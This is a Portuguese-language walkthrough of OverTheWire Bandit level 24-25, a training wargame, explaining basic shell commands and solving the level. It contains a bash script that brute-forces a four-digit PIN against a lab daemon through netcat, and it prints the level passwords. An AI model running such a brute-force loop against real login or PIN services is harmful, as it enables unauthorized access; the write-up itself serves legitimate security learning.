# [Bandit Level 24-25](https://overthewire.org/wargames/bandit/bandit25.html)

## Descrição original
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Introdução
O objetivo desse level é enviar o password do level atual(bandit24) e um pincode numérico de 4 dígitos para a porta 30002. O próprio desafio informa que a única forma de encontrar esse pincode é realizar todas as 10000 combinações possíveis, o que é chamado de brute-force.

## Comandos utilizados:

```
ssh: permite que você acesse e controle um computador remoto de forma segura, como se estivesse interagindo diretamente com a máquina.

-p: determina em qual porta a conexão com o servidor será realizada.
```

```
ls: lista o conteúdo do diretório especificado.

-l: lista os arquivos e diretórios de um determinado diretório em formato de lista incluindo detalhes como permissões, grupo e tamanho.
```

```
whoami: exibe o nome do usuário que está atualmente logado no terminal ou no sistema operacional.
```
```
echo: exibe texto ou variáveis na saída padrão (normalmente o terminal).
```

```
tee: usado para ler a entrada padrão (normalmente vinda de um comando ou script) e escrever essa entrada tanto na saída padrão (geralmente o terminal) quanto em um ou mais arquivos especificados.
```

```
cat: exibe o conteúdo de um ou mais arquivos de texto diretamente no terminal.
```

```
vim: é um editor de texto altamente configurável e poderoso, amplamente utilizado em sistemas Unix-like, como Linux. 

:wq (Write and Quit): Ao combinar os comandos :w e :q, você pode salvar as alterações no arquivo e sair do Vim ao mesmo tempo.
```

```
chmod x: adiciona permissão de execução para um arquivo. 
```

```
nc: abreviação de "netcat", é uma ferramenta de linha de comando que é frequentemente usada para transferência de dados, conexões de rede e teste de conectividade em ambientes de rede
```

## Resolução

```
┌──(lufeltz㉿lufeltz)-[~]
└─$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Logo após iniciar essa conexão com o **ssh** informo o password obtido no desafio anterior.

```
bandit24@bandit.labs.overthewire.org's password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

```console
bandit24@bandit:~$ whoami
bandit24
```

Realizado o login faço o envio do password do **bandit24** para a porta 30002:


```console
bandit24@bandit:~$ echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
```

A mensagem de retorno diz eu não informei dados suficientes. Vamos tentar então com uma mensagem e um pincode separados por um espaço:

```console
bandit24@bandit:~$ echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" 1234 | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
_
```

Dessa vez a mensagem informada é que o pincode está errado. Agora só preciso criar um script para realizar o brute-force:

**vim /tmp/brute-force25.sh**
```console
#!/bin/bash

pass="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
port=30002

for pincode in {0..10000}; do
    printf "%s %04d\n" "$pass" "$pincode"
done | nc localhost "$port" | tee /tmp/resultados.txt

echo "resultados salvos em /tmp/resultados.txt"
```

Nesse script utilizo um loop **for** para redirecionar todos os **10.000** pincodes de **0000** à **10000** para uma conexão com a porta **30002.** Após isso faço outro direcionamento, dessa vez das tentativas de conexão utilizando o comando **tee** que direciona a saída para o arquivo **/tmp/resultados.txt** e também para saída padrão(terminal).

Antes de executá-lo altero as permissões para permitir a execução desse arquivo:

```console
bandit24@bandit:~$ chmod +x /tmp/brute-force25.sh
```

```console
bandit24@bandit:~$ /tmp/brute-force25.sh
...
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
resultados salvos em /tmp/resultados.txt
```
Após a execução do script **/tmp/brute-force25.sh**(pode ser necessário executar mais de uma vez, pois às vezes o servidor trava) o password é mostrado.

Dessa forma encontro o password do próximo level **bandit25**:

    p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Por fim saio do usuário atual por meio do comando exit.

```console
bandit24@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```